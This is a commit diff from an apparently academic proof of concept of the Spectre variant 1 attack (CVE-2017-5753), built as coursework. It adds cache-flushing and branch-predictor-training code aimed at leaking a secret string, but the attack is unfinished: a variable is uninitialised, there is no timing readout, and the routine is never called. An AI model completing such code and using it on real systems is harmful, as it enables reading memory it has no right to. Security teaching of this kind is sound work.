222c3bb330660a176a54ea560ca7dd875d87a9f8
Matthew Gilpin <matty0005@gmail.com>
2023-03-12 16:14:10 +1000

    More update to code

--- README.md
+++ README.md
@@ -1,2 +1,15 @@
 # spectre
 A proof of concept for CVE2017-5753 'Spectre' for COMS4507
+
+# Build
+## Requirments
+Unix based OS pre-2017. 
+
+## Make
+Clone source code, cd into the repo and run make
+
+```
+git clone https://github.com/matty0005/spectre
+cd spectre
+make
+```
--- main.c
+++ main.c
@@ -14,13 +14,7 @@
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
-
-int main() {
-    printf("-- Spectre Demo for COMS4507 Semester 1 2023 --\n");
-    printf("-- CVE2017-5753 --\n");
-
-    return 0;
-}
+#include <x86intrin.h>
 
 
 /**
@@ -28,13 +22,71 @@ int main() {
  * 
  */
 
-uint32_t array_1_size = 16;
+uint32_t array1_size = 16;
 uint8_t  array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,16};
 uint8_t  array2[256 * 512];
 
 char *secret = "The secret COMS4507 password is :\"incorrect\"";
+uint8_t tmp = 0;
 
+void victim_function(size_t x) {
+    if (x < array1_size) {
+        tmp ^= array2[array1[x] * 512];
+    }
+}
 
 /**
  * End victim code.
  */
+
+
+void readMemory(size_t target_index, uint8_t value[2], int score[2]) {
+
+    static int results[256];
+    size_t train_x, x;
+    
+    for (int i = 0; i < 256; i++)
+        results[i] = 0;
+
+    for (int tries = 999;  tries > 0; tries--) {
+        
+        // First flush array from cache
+        for (int i = 0; i < 256; i++)
+            _mm_clflush(&array2[i*512]);
+
+        // Train the BTB 
+        for (int i = 29; i >= 0; i--) {
+            
+            _mm_clflush(&array1_size);
+            for (volatile int z = 0; z < 100; z++)
+                ;
+
+
+            // Bit manipulation to reduce branches - would affect
+            // branch predictor.
+            // Sets x = train_x if (i mod 6 == 0)
+            x = ((i % 6) - 1) & ~0xFFFF;
+            x = (x | (x >> 16));
+            x = train_x ^ (x & (target_index ^ train_x));
+
+            // Victim function
+            victim_function(x);
+        }   
+    }
+
+}
+
+
+/**
+ * @brief Main program
+ * 
+ */
+int main() {
+    printf("-- Spectre Demo for COMS4507 Semester 1 2023 --\n");
+    printf("-- CVE2017-5753 --\n");
+
+    victim_function(2);
+
+    return 0;
+}
+
